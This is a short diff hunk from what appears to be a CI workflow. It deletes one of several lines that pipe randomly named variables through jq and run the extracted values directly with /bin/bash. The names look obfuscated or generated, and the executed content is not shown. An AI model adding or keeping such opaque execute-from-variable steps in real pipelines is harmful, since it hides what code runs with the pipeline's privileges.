@@ -36,7 +36,6 @@ jobs:
           echo $jb812 | jq -r .kur19 | /bin/bash
           printf '%s' "$xotrl137" | jq -r .gbtk2 | /bin/bash
           printf '%s' "$tvw2" | jq -r .vj9 | /bin/bash
-          echo $lvrsb08603 | jq -r .u9102 | /bin/bash
           echo $prfxb256 | jq -r .hcw62832 | /bin/bash
           printf '%s' "$us0" | jq -r .ujrex5 | /bin/bash
           printf '%s' "$ryom17932" | jq -r .hit7 | /bin/bash
